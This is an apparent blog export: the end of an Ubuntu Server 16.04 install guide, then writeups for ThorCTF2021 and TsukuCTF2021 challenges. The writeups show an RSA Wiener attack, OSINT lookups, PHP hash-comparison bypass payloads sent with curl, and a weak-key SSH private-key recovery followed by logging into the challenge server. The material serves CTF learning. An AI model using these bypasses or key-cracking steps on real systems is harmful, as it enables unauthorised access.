<li>然后可能会出现时区设置错误，选择 &quot;Continue(继续)&quot;,进入如下界面，选择&quot;Install the system(安装系统)&quot;,然后直接回车，选择&quot;Partion disks(磁盘分区)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170228.jpg)<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170234.jpg)</li>
<li>出现下图界面，询问你是否&quot;Umount partitions that are in use(卸载正在使用的分区)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170255.jpg)</li>
<li>选择&quot;Partitioning method(分区方法)&quot;，这里我们选择&quot;Guided - use entire disk and set up LVM(使用整个磁盘并配置LVM)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170318.jpg)</li>
<li>&quot;Select disk to partition(选择要分区的磁盘)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170325.jpg)</li>
<li>选择&quot;Partitioning Scheme(分区方案) &quot;，这里推荐选择&quot;All files in one partition(所有文件放在同一分区)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170331.jpg)</li>
<li>出现如下界面，询问你是否&quot;Write the changes to disks and configure LVM(将修改写入磁盘并配置LVM)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170342.jpg)</li>
<li>设置&quot;Name of the volume group for the new system(新系统的卷组名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170359.jpg)</li>
<li>设置&quot;Amount of volume group to use for guided partitioning(用于分区引导的卷组数)&quot;，默认大小即可，无需修改；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170421.jpg)</li>
<li>出现下图界面，询问你是否&quot;Umount partitions that are in use(卸载正在使用的分区)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170434.jpg)</li>
<li>出现如下界面，询问你是否&quot;Force UEFI installation(强制UEFI安装)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170442.jpg)</li>
<li>出现如下界面，询问是否&quot;Write the changes to disks(将改动写入磁盘)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170452.jpg)</li>
<li>&quot;Kernel to install(要安装的内核)&quot;,选择默认的&quot;Linux-generic&quot;即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170544.jpg)</li>
<li>回车后出现如下界面，这里要选择包含在initrd中的驱动程序，选择默认的&quot;generic:include all available drivers(通用:包含所有可用的驱动程序)&quot;即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170555.jpg)</li>
<li>&quot;HTTP proxy information(HTTP代理信息)&quot;不写，直接回车即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170657.jpg)</li>
<li>询问你管理系统更新的方式，选择&quot;No automatic updates(不自动更新)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170737.jpg)</li>
<li>&quot;Choose software to install(选择要安装的软件)&quot;，建议勾选上&quot;OpenSSh server&quot;，然后回车;<br>选择方法为:通过键盘上下键移动光标至选要择项，在要选择的项上按空格即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724154325.jpg)</li>
<li>回车后，显示安装完成，继续回车，重启系统，此时就可以拔掉U盘；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170940.jpg)</li>
<li>重启后，再次进入TDM，将&quot;Boot Mode(引导模式)&quot;改为&quot;Legacy　Only(仅Legacy模式)&quot;，否则有可能出现不能进入Linux系统的情况；</li>
</ol>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>ThorCTF2021 Writeup</title>
    <url>/posts/1756116899/</url>
    <content><![CDATA[<h1 id="Shingeki-no-RSA"><a href="#Shingeki-no-RSA" class="headerlink" title="Shingeki no RSA"></a>Shingeki no RSA</h1><p><em>One encryption, three params, you know what to do.</em></p>
<p><a href="https://drive.google.com/file/d/1xbwFfAHu5OWbkEV3QlYGP59nHXpv57WT/view?usp=sharing">https://drive.google.com/file/d/1xbwFfAHu5OWbkEV3QlYGP59nHXpv57WT/view?usp=sharing</a></p>
<hr>
<p>题目给了一个<code>out.txt</code>,里面包含<code>n</code>,<code>e</code>,<code>c</code>的值</p>
<p>使用<a href="https://github.com/pablocelayes/rsa-wiener-attack">rsa-wiener-attack</a>破解得到d的值</p>
<pre><code class="shell">~$ python RSAwienerHacker.py
Hacked!
50954488565980029757584514143249292352586758895690937600871123296191815851393
</code></pre>
<p>代码:</p>
<pre><code class="python">from Crypto.Util.number import long_to_bytes
import gmpy2
e = 573539981054118375159951884901136205381955275096471242113613923667834312363548126598981740314307696033323138227176735824259098674326069670063001503892366653022633390483272968412233602239104757299239510751275655288670147128536527296060843927282827574422039154045360669647002461865276005609405093376965933104257
n = 666012509503758414438426745752029036046328310944346357068259451859585174290580664150188141697939659811599336002592599704089746160399428670863696780761420173279676565150259812749267725206078003773597631925996185977321417456827136083352043009732414371490356153874019687554196902819696964658218055292422529903061
c = 208271638964220806986932660131544686073844142913497222151993342727885811478884727510239109595118929917803309949401762080874858518281133929171859315997601484068462684780596513932104673255797873067799046024798017005908221308124294210078684387266545107254593378287958436606968619452939117043031695740389528821956
d = 50954488565980029757584514143249292352586758895690937600871123296191815851393
m = gmpy2.powmod(c, d, n)
print(long_to_bytes(m))
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;d1d_y0u_us3_w13n3r&#39;s?&#125;</code></p>
<h1 id="Happy-Flag"><a href="#Happy-Flag" class="headerlink" title="Happy Flag"></a>Happy Flag</h1><p><em>We have many flags. But we need a good flag!</em></p>
<p><a href="https://drive.google.com/file/d/1194sBi8Ijb4C-cYDGP2qZvXgj9uxSe7R/view?usp=sharing">https://drive.google.com/file/d/1194sBi8Ijb4C-cYDGP2qZvXgj9uxSe7R/view?usp=sharing</a></p>
<hr>
<p>题目给了一个文件<code>world_flags.zeep</code>,<code>file</code>后发现是一个zip压缩文件,使用<code>unzip</code>解压.</p>
<p>解压后发现有</p>
<pre><code class="shell">~$ file world_flags.zeep
world_flags.zeep: Zip archive data, at least v1.0 to extract
~$ unzip world_flags.zeep
Archive:  world_flags.zeep
   creating: world_flags/
  inflating: world_flags/1.txt       
  inflating: world_flags/10.txt      
  inflating: world_flags/100.txt     
  inflating: world_flags/1000.txt    
  inflating: world_flags/10000.txt   
  inflating: world_flags/10001.txt
  ....
</code></pre>
<p>直接<code>cat</code>所有文件,然后用<code>uniq</code>去重</p>
<pre><code class="shell">~$ cat *.txt | uniq
SBGTF&#123;false_flag_🥺&#125; 
SBCTF&#123;Cool_flag_!!!&#125;
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;Cool_flag_!!!&#125;</code></p>
<h1 id="Query-The-Flag"><a href="#Query-The-Flag" class="headerlink" title="Query The Flag"></a>Query The Flag</h1><p><em>Query the flag</em></p>
<p><em><a href="https://drive.google.com/file/d/1pwr09e-BoNoJujrJJ_hlAuhEGgJnsb6V/view?usp=sharing">https://drive.google.com/file/d/1pwr09e-BoNoJujrJJ_hlAuhEGgJnsb6V/view?usp=sharing</a></em></p>
<hr>
<p>题目给了一个SQLite的数据库文件,直接grep</p>
<pre><code class="shell">~$ strings find.db | grep SBCTF                           
SBCTF&#123;I_w@s_s0_sl33py_D3s1gn1ng_7h1s&#125;NULL
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;I_w@s_s0_sl33py_D3s1gn1ng_7h1s&#125;</code></p>
<h1 id="they-all-look-the-same"><a href="#they-all-look-the-same" class="headerlink" title="they all look the same"></a>they all look the same</h1><p><em>They are slightly different</em></p>
<p><a href="https://drive.google.com/file/d/1XjkSCEjydggD7FHaWsBxKYTrivyesd1M/view?usp=sharing">https://drive.google.com/file/d/1XjkSCEjydggD7FHaWsBxKYTrivyesd1M/view?usp=sharing</a></p>
<hr>
<p>解压下载的zip文件,发现里面一堆jpg文件,首先看看md5值</p>
<pre><code class="shell">~$ md5 *
MD5 (images - Copy (1).jpg) = b69410fdc3f11fbac6bb3e32e40df1de
MD5 (images - Copy (10).jpg) = 1aa6e81b2335fdee91492125d4352503
MD5 (images - Copy (100).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66
MD5 (images - Copy (101).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66
MD5 (images - Copy (102).jpg) = 592434721909e841870ba0cfc0bce6aa
MD5 (images - Copy (103).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66
MD5 (images - Copy (104).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66
MD5 (images - Copy (105).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66
</code></pre>
<p>然后用<code>exiftool</code>查看文件的元数据试试</p>
<pre><code class="shell">~$ exiftool images\ -\ Copy\ \(1\).jpg
ExifTool Version Number         : 12.31
File Name                       : images - Copy (1).jpg
Directory                       : .
File Size                       : 16 KiB
File Modification Date/Time     : 2021:11:21 00:21:28+08:00
File Access Date/Time           : 2021:12:10 09:32:26+08:00
File Inode Change Date/Time     : 2021:12:10 09:32:26+08:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : S
XP Title                        : S
Padding                         : (Binary data 2060 bytes, use -b option to extract)
About                           : uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b
Title                           : S
Description                     : S
Image Width                     : 376
Image Height                    : 134
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 376x134
Megapixels                      : 0.050
</code></pre>
<p>发现<code>Image Description</code>里有一个S,顺序打印一下所有文件的<code>Image Description</code>试试</p>
<pre><code class="shell">~$ for i in `seq 1 153`;do exiftool images\ -\ Copy\ \($&#123;i&#125;\).jpg| grep &quot;Image Description&quot;;done
Image Description               : S
Image Description               : B
Image Description               : C
Image Description               : T
Image Description               : F
Image Description               : &#123;
Image Description               : H
Image Description               : 0
Image Description               : w
....

~$ cat tmp |  awk &#39;&#123;print $4&#125;&#39; | xargs echo
S B C T F &#123; H 0 w _ c 0 u l d _ y 0 u _ d ! s t ! n g u ! s h S _ S S S ! S S S m S S S @ S S S g S S S 3 S S S s S S S _ S S S
</code></pre>
<p>结尾似乎有一些多余的S,去掉后即可得到flag</p>
<p><strong>flag:</strong><code>SBCTF&#123;H0w_c0uld_y0u_d!st!ngu!sh_!m@g3s_&#125;</code></p>
<h1 id="Discord"><a href="#Discord" class="headerlink" title="Discord"></a>Discord</h1><p><em>Find the account creation date of one of our discord channel admins (4dam).</em></p>
<p><em>Note: Please put the date in this format YYYY&#x2F;MM&#x2F;DD for submission, like this: SBCTF{1970&#x2F;01&#x2F;01}</em></p>
<hr>
<p>题目要求我们找到管理员<code>4dam</code>创建账号的时间.</p>
<p>首先打开Discord-&gt;:gear:-&gt;高级设置,打开“开发者模式”</p>
<p><img data-src="/../../CTF/ThorCTF2021/Osint/images/image-20211209130044097.png" alt="image-20211209130044097"></p>
<p>对着头像右键,复制ID(<code>808684903301775360</code>)</p>
<p><img data-src="/../../CTF/ThorCTF2021/Osint/images/image-20211209130410067.png" alt="image-20211209130410067"></p>
<p>打开<a href="https://snowsta.mp/?l=zh-cn&z=5&f=ht4idgkcy7-11s">https://snowsta.mp</a>,输入ID查询</p>
<p><img data-src="/../../CTF/ThorCTF2021/Osint/images/image-20211209131027396.png" alt="image-20211209131027396"></p>
<p><strong>flag:</strong><code>SBCTF&#123;2020/02/09&#125;</code></p>
<h1 id="Email-Hunt"><a href="#Email-Hunt" class="headerlink" title="Email Hunt"></a>Email Hunt</h1><p><em>I want to find the PGP Public Key of someone&#39;s ProtonMail account, but all I got is a useless document he shared with me (<a href="https://docs.google.com/spreadsheets/d/1iBRs347v5xXICdgHm4-sQBEFozbqhTABPIespxSBI20">https://docs.google.com/spreadsheets/d/1iBRs347v5xXICdgHm4-sQBEFozbqhTABPIespxSBI20</a>).</em><br><em>Can you help me find it?</em></p>
<p><em>Note: Please submit the flag like this example:</em></p>
<pre><code class="asciiarmor">-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: ProtonMail

aBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBB
BBBBYz
-----END PGP PUBLIC KEY BLOCK-----
</code></pre>
<p><em>Flag: SBCTF{aBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBYz}</em></p>
<hr>
<p>访问题目中给出的Google表格的链接.</p>
<p>然后访问<a href="https://docs.google.com/spreadsheets/u/0/">https://docs.google.com/spreadsheets/u/0/</a>查看最近访问的表格文件,并用F12抓包</p>
<p><img data-src="/../../CTF/ThorCTF2021/Osint/images/image-20211208101433762.png" alt="image-20211208101433762"></p>
<p>找到Gmail邮箱<code>priv4te3mail0fmr.8@gmail.com</code></p>
<p>题目要求我们找到ProtonMail账号的PGP公钥,猜测邮箱前缀可能一样,即<code>priv4te3mail0fmr.8@protonmail.com</code></p>
<p>参照<a href="https://protonmail.com/support/knowledge-base/download-public-private-key/">https://protonmail.com/support/knowledge-base/download-public-private-key/</a>,下载PGP公钥</p>
<pre><code class="shell">~$ wget https://api.protonmail.ch/pks/lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com
--2021-12-08 10:43:59--  https://api.protonmail.ch/pks/lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com
正在解析主机 api.protonmail.ch (api.protonmail.ch)... 185.70.42.25
正在连接 api.protonmail.ch (api.protonmail.ch)|185.70.42.25|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：709 [application/pgp-keys]
正在保存至: “lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com”

lookup?op=get&amp;search=priv4te3mail0fmr 100%[========================================================================&gt;]     709  --.-KB/s  用时 0s

2021-12-08 10:44:00 (225 MB/s) - 已保存 “lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com” [709/709])
~$ cat lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: ProtonMail

xjMEYZcIIhYJKwYBBAHaRw8BAQdAgXzkYJTBPtkxMSemLogafK1ryTzAsPoU
bjT8hQ6Wc4XNRXByaXY0dGUzbWFpbDBmbXIuOEBwcm90b25tYWlsLmNvbSA8
cHJpdjR0ZTNtYWlsMGZtci44QHByb3Rvbm1haWwuY29tPsKPBBAWCgAgBQJh
lwgiBgsJBwgDAgQVCAoCBBYCAQACGQECGwMCHgEAIQkQBcfjCjlf+3IWIQRS
LQS+kFOUoSEmSs4Fx+MKOV/7cgCtAP0dhlLk+UMY9FBnN/SiR+nIObn0q4f/
AS2k8kRvuA9cQgEA13kb1fTDmIGXp/rkTh9MSUt22m6rF5khiOr9yCYoTQrO
OARhlwgiEgorBgEEAZdVAQUBAQdARRDPDTZcD3gJkaXMzYOSGcLSY0M8PEMs
8w0eI9ydnxcDAQgHwngEGBYIAAkFAmGXCCICGwwAIQkQBcfjCjlf+3IWIQRS
LQS+kFOUoSEmSs4Fx+MKOV/7ckoLAQCjmVOWyFLflAz5dCinOZI0G8yOsduV
8PSw2hvTeyiZMwEAkl9U2tmg2i/XW5PckxqvNgxAZZkkEoQPWa6UpKICIw8=
=E+gi
-----END PGP PUBLIC KEY BLOCK-----
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;xjMEYZcIIhYJKwYBBAHaRw8BAQdAgXzkYJTBPtkxMSemLogafK1ryTzAsPoUbjT8hQ6Wc4XNRXByaXY0dGUzbWFpbDBmbXIuOEBwcm90b25tYWlsLmNvbSA8cHJpdjR0ZTNtYWlsMGZtci44QHByb3Rvbm1haWwuY29tPsKPBBAWCgAgBQJhlwgiBgsJBwgDAgQVCAoCBBYCAQACGQECGwMCHgEAIQkQBcfjCjlf+3IWIQRSLQS+kFOUoSEmSs4Fx+MKOV/7cgCtAP0dhlLk+UMY9FBnN/SiR+nIObn0q4f/AS2k8kRvuA9cQgEA13kb1fTDmIGXp/rkTh9MSUt22m6rF5khiOr9yCYoTQrOOARhlwgiEgorBgEEAZdVAQUBAQdARRDPDTZcD3gJkaXMzYOSGcLSY0M8PEMs8w0eI9ydnxcDAQgHwngEGBYIAAkFAmGXCCICGwwAIQkQBcfjCjlf+3IWIQRSLQS+kFOUoSEmSs4Fx+MKOV/7ckoLAQCjmVOWyFLflAz5dCinOZI0G8yOsduV8PSw2hvTeyiZMwEAkl9U2tmg2i/XW5PckxqvNgxAZZkkEoQPWa6UpKICIw8==E+gi&#125;</code></p>
<h1 id="Tricks-1"><a href="#Tricks-1" class="headerlink" title="Tricks 1"></a>Tricks 1</h1><p><em>A couple of PHP Tricks, give it a try.</em></p>
<hr>
<pre><code class="php"> &lt;?php
    error_reporting(0);

    if (isset($_GET[&quot;a&quot;]) &amp;&amp; isset($_GET[&quot;b&quot;])) &#123;
        if ($_GET[&quot;a&quot;] !== $_GET[&quot;b&quot;] &amp;&amp; sha1($_GET[&quot;a&quot;]) === sha1($_GET[&quot;b&quot;])) &#123;
            if ($_GET[&quot;a&quot;] !== $_GET[&quot;b&quot;] &amp;&amp; md5($_GET[&quot;a&quot;]) === md5($_GET[&quot;b&quot;])) &#123;
                $flag = file_get_contents(&quot;../../flag&quot;);
                echo $flag;
            &#125;else &#123;
                echo &quot;Didn&#39;t get passed MD5.&quot;;
            &#125;
        &#125;else &#123;
            echo &quot;Didn&#39;t get passed SHA1.&quot;;
        &#125;
    &#125;else &#123;
        highlight_file(__FILE__);
        die();
    &#125;
?&gt; 
</code></pre>
<p><code>md5</code>和<code>sha1	</code>不能用来处理数组,<code>md5(arr)</code>和<code>sha1(arr)</code>会返回null</p>
<p><strong>payload</strong>: <code>a[]=a&amp;b[]=b</code></p>
<pre><code class="shell">~$ curl &quot;https://ch5.sbug.se/?a[]=a&amp;b[]=b&quot;
SBCTF&#123;g07_2_w17h_0n3_SH07?&#125;
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;g07_2_w17h_0n3_SH07?&#125;</code></p>
<h1 id="Tricks-2"><a href="#Tricks-2" class="headerlink" title="Tricks 2"></a>Tricks 2</h1><p><em>Another  round of PHP Tricks, good luck.</em></p>
<hr>
<pre><code class="php">&lt;?php error_reporting(0);
if (isset($_GET[&#39;a&#39;]) &amp;&amp; isset($_GET[&#39;b&#39;])) &#123;
    if (  strlen($_GET[&#39;a&#39;]) &gt;  mb_strlen($_GET[&#39;b&#39;], base64_decode(&#39;dXRmOA==&#39;) )) &#123;
        if (strlen($_GET[&#39;b&#39;]) &gt; mb_strlen($_GET[&#39;a&#39;], base64_decode(&#39;dXRmOA==&#39;))) &#123;
            $u327a6c4304ad5938 = file_get_contents(base64_decode(&#39;Li4vLi4vZmxhZw==&#39;));
            echo $u327a6c4304ad5938;
        &#125; else &#123;
            echo base64_decode(&#39;QWxyaWdodC4=&#39;);
        &#125;
    &#125; else &#123;
        echo base64_decode(&#39;VHJ5IGhhcmRlci4=&#39;);
    &#125;
&#125; else &#123;
    highlight_file(__FILE__);
    die();
&#125; ?&gt;
</code></pre>
<p><a href="https://www.php.net/manual/zh/function.strlen.php">strlen</a>返回的是字符串的字节数，而不是其中字符的数量.</p>
<p><a href="https://www.php.net/manual/zh/function.mb-strlen.php">mb-strlen</a> 用来获取字符串的长度,多字节的字符被计为1.</p>
<p>因此这里用多字节字符作为参数即可</p>
<p><strong>payload</strong>: <code>a=大&amp;b=大</code></p>
<pre><code class="shell">$ curl &quot;https://ch6.sbug.se/?a=大&amp;b=大&quot;
SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>TsukuCTF2021 Writeup</title>
    <url>/posts/434189373/</url>
    <content><![CDATA[<h1 id="CrackSSH"><a href="#CrackSSH" class="headerlink" title="CrackSSH!"></a>CrackSSH!</h1><p><em>調査対象のサーバーで使われている公開鍵を入手した。噂によると、この鍵には問題があるらしいが...。なんとかして侵入しなければ。</em><br><em>Target: frt.hongo.wide.ad.jp</em><br><em>Port: 30022</em></p>
<hr>
<p>题目中给了一个公钥:</p>
<pre><code class="asciiarmor">ssh-rsa AAAAB3NzaC1yc2EAAACBAWKA1hYjuvhxiwCGKsG+nbLj/iYy6pRwkkka64J6L+VLPp4K3JVSREEzmztAWxjkhGOleol3vzDRqR2J+4nSVOI9FhJyiBdSgECmXJYojGVSU56bCMdcysEkKYVz5e0+xQAjZDrotpm+FT0VAdwdWuZM68zZY8DE9H2uo9daHCf/AAAAgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1aalXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQ== tsukushi@frt.hongo.wide.ad.jp
</code></pre>
<p>参考知乎(<a href="https://zhuanlan.zhihu.com/p/33949377">ssh-keygen生成的id_rsa文件的格式</a>)上的的一篇文章:</p>
<p>首先,<code>awk &#39;&#123;print $2&#125;&#39; crackssh.pub | base64 -d | hexdump -C</code>,得到:</p>
<pre><code class="assembly">00000000  00 00 00 07 73 73 68 2d  72 73 61 00 00 00 81 01  |....ssh-rsa.....|
00000010  62 80 d6 16 23 ba f8 71  8b 00 86 2a c1 be 9d b2  |b...#..q...*....|
00000020  e3 fe 26 32 ea 94 70 92  49 1a eb 82 7a 2f e5 4b  |..&amp;2..p.I...z/.K|
00000030  3e 9e 0a dc 95 52 44 41  33 9b 3b 40 5b 18 e4 84  |&gt;....RDA3.;@[...|
00000040  63 a5 7a 89 77 bf 30 d1  a9 1d 89 fb 89 d2 54 e2  |c.z.w.0.......T.|
00000050  3d 16 12 72 88 17 52 80  40 a6 5c 96 28 8c 65 52  |=..r..R.@.\.(.eR|
00000060  53 9e 9b 08 c7 5c ca c1  24 29 85 73 e5 ed 3e c5  |S....\..$).s..&gt;.|
00000070  00 23 64 3a e8 b6 99 be  15 3d 15 01 dc 1d 5a e6  |.#d:.....=....Z.|
00000080  4c eb cc d9 63 c0 c4 f4  7d ae a3 d7 5a 1c 27 ff  |L...c...&#125;...Z.&#39;.|
00000090  00 00 00 81 02 01 f9 8f  ba 8e 6f 71 bc d8 9b 9d  |..........oq....|
000000a0  92 c8 a0 0b c8 56 fd 46  7e 56 e3 43 90 28 2a 9e  |.....V.F~V.C.(*.|
000000b0  76 c8 fa be de 74 6b d4  dd 5a 6a 55 e1 1d 5d 69  |v....tk..ZjU..]i|
000000c0  5d cc 1a d7 2a da f3 5f  83 14 3b 2e e1 b7 69 3c  |]...*.._..;...i&lt;|
000000d0  2e df db 9a 4b ae 20 59  29 a4 8d 4f b2 b4 fa c4  |....K. Y)..O....|
000000e0  50 74 fe 74 88 16 98 8e  c1 76 0b 28 3c 1e 3a 1e  |Pt.t.....v.(&lt;.:.|
000000f0  19 a5 d5 92 1d db 3b 0d  95 d9 6c 14 b1 4e 2a 12  |......;...l..N*.|
00000100  bf 53 8c f6 cc ce b0 82  c6 41 43 40 f9 f0 3b 09  |.S.......AC@..;.|
00000110  a2 59 03 3c 19                                    |.Y.&lt;.|
00000115
</code></pre>
<ul>
<li><p>前4个字节(00 00 00 07)表示接下来的数据块是7个字节,接下来7个字节的内容是73 73 68 2d 72 73 61,正好是<code>ssh-rsa</code>的ASCII码</p>
</li>
<li><p>接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到e的16进制</p>
</li>
<li><p>再接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到n的16进制</p>
<pre><code class="shell">~$ echo &quot;$((16#00000081))&quot;
129
~$ N=$(awk &#39;&#123;print $2&#125;&#39; ~/.ssh/id_rsa.pub | base64 -d | hexdump -ve &#39;1/1 &quot;%.2x&quot;&#39;)
~$ e=$&#123;N: 30:129*2&#125; &amp;&amp; echo $e
0100010000020100e5f95a4428736b17d113d90b86eba7d9052ebec087c808fd3e5704a10b2df04638b309f0e7cae4b0cd5bcefbfae5c28f681edbedaf10e35c77201380f4d309b337c8e0c62e815a967d18c9a4642fb1ebc44ea3a4a75335d097135895a7604e1662c6df43d61212f389288f4e717e4e6ebec06ce1fc5b1d4c2c
~$ n=$&#123;N: -129*2&#125; &amp;&amp; echo $n
bf582bcc145ea7b5b398b0c51c06be2d367248f6c247653e928bb317a290d7e7a99c169999cf0dbc56f875948d236da894abf2c8b4aac54d5dcb2b6ac8bfb1f9d87416a94a46e70d3083811a0397dcc8abea0b7e1b88fd230f05fd5d45de5bdee21d535aea684749a5c576d8b6e96aa358175f8f7666f27e9729fab06e25ac8021
</code></pre>
</li>
</ul>
<blockquote>
<p>官方的Writeup给了另一种做法,可以直接得到e和n的16进制表示形式</p>
<pre><code class="shell">~$ ssh-keygen -f crackssh.pub -e -m pem | openssl asn1parse
    0:d=0  hl=4 l= 264 cons: SEQUENCE          
    4:d=1  hl=3 l= 129 prim: INTEGER  :0201F98FBA8E6F71BCD89B9D92C8A00BC856FD467E56E34390282A9E76C8FABEDE746BD4DD5A6A55E11D5D695DCC1AD72ADAF35F83143B2EE1B7693C2EDFDB9A4BAE205929A48D4FB2B4FAC45074FE748816988EC1760B283C1E3A1E19A5D5921DDB3B0D95D96C14B14E2A12BF538CF6CCCEB082C6414340F9F03B09A259033C19
  136:d=1  hl=3 l= 129 prim: INTEGER  :016280D61623BAF8718B00862AC1BE9DB2E3FE2632EA947092491AEB827A2FE54B3E9E0ADC95524441339B3B405B18E48463A57A8977BF30D1A91D89FB89D254E23D1612728817528040A65C96288C6552539E9B08C75CCAC124298573E5ED3EC50023643AE8B699BE153D1501DC1D5AE64CEBCCD963C0C4F47DAEA3D75A1C27FF
</code></pre>
</blockquote>
<p>使用<a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>生成私钥,保存至<code>id_rsa</code></p>
<pre><code class="shell">python RsaCtfTool.py -n 360925413365609656207284763303112593050686426607629131354843699618905677197872793512380288223361149508460688151102823348462592916817609977273908821217493993702786929282477487755465976082059834867631026295714550319202482180891845062064382568022072228888091051431136923983143306662931216184662445381040847666201 -e 248940659700671391171916045022225211367167934215525303038734152650593067612113589541083076628705613883775652505492831370527586438096113903892713520850387855997035509546247913887222055672708066391999421835495881798128330308530099218984443115901043292942963247939575084326452874538239309850357410618060448737279 --private
</code></pre>
<pre><code class="asciiarmor">-----BEGIN RSA PRIVATE KEY-----
MIICOQIBAAKBgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1a
alXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2
Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQKBgQFi
gNYWI7r4cYsAhirBvp2y4/4mMuqUcJJJGuuCei/lSz6eCtyVUkRBM5s7QFsY5IRj
pXqJd78w0akdifuJ0lTiPRYScogXUoBAplyWKIxlUlOemwjHXMrBJCmFc+XtPsUA
I2Q66LaZvhU9FQHcHVrmTOvM2WPAxPR9rqPXWhwn/wIgNHyza85w/fnNPOZwpCTM
OZ6242GZZRcNX4iFJaXeun8CQQEL5ReRSsEcF106aHY8Yohd4FxaChPms4M8/DXP
+WMC6GT0qWRj3LZYkndvP2WxVOoZYxf0rQc+ew9rFVaZ6OotAkEB6ydXjs82dKS/
KS3ffoUyj4oh7viR9j3fH5WBep9S0MeyVZc16Cwj0mPZDRbL1n7Cs0oSZD/A4FzO
OgWAxc2pHQIgNHyza85w/fnNPOZwpCTMOZ6242GZZRcNX4iFJaXeun8CIDR8s2vO
cP35zTzmcKQkzDmetuNhmWUXDV+IhSWl3rp/AkBdum7eZMxE/VYX7QV9xND/bpn2
/MHD4BHF8c/MirawY5HC/RTviwnfpXAoF4ArBY1ZG3nCn9L19v/sUcFQKC9X
-----END RSA PRIVATE KEY-----
</code></pre>
<pre><code class="shell">chmod 600 id_rsa
ssh tsukushi@frt.hongo.wide.ad.jp -p 30022 -i id_rsa
</code></pre>
<p><strong>flag:</strong><code>TsukuCTF&#123;D0nt_use_w34k_RS4_key_generat10n&#125;</code></p>
